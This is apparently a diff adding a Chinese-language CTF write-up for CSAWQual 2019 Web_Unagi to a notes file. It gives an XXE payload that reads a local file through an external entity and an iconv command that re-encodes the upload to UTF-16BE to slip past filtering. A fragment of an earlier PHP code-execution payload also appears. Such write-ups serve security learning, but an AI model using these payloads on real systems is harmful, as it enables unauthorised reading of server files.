@@ -2429,6 +2429,37 @@ payload:`?exp=print_r(highlight_file(next(array_reverse(scandir(current(localeco
     <user><username>&test;</username><password>1123</password></user>
    ```
 
+### CSAWQual 2019 Web_Unagi
+
+这道题和上面一道题目一样，都是XXE,不一样的地方是这道题目是以上传文件的形式读取文件的
+
+题目中提示有实例模板和flag的位置，看到示例模板，发现xml类型，所以就想到了XXE
+
+1. 首先把payload写入文件，文件后缀名xml
+    ```xml
+    <?xml version = "1.0"?>
+    <!DOCTYPE users [
+        <!ENTITY admin SYSTEM "file:///flag">]>
+    <users>
+        <user>
+            <username>&admin;</username>
+            <password>1123</password>
+            <name>&admin;</name>
+            <email>a@a.com</email>
+            <group>CSAW2019</group>
+            <intro>&admin;</intro>
+        </user>
+    </users>
+    ```
+2. 用下面命令更改编码方式
+
+    ```bash
+    cat xml.xml | iconv -f UTF-8 -t UTF-16BE > 1.xml
+    ```
+3. 上传1.xml
+
+    经过测是，在name处的flag被截断了，可能有长度限制，intro标签处可以正常输出
+
 ## BJDCTF2020 Mark loves cat(.git目录泄露+代码审计)
 
 1. 进去之后找不到有用的信息，dirsearch扫描目录，发现.git泄露
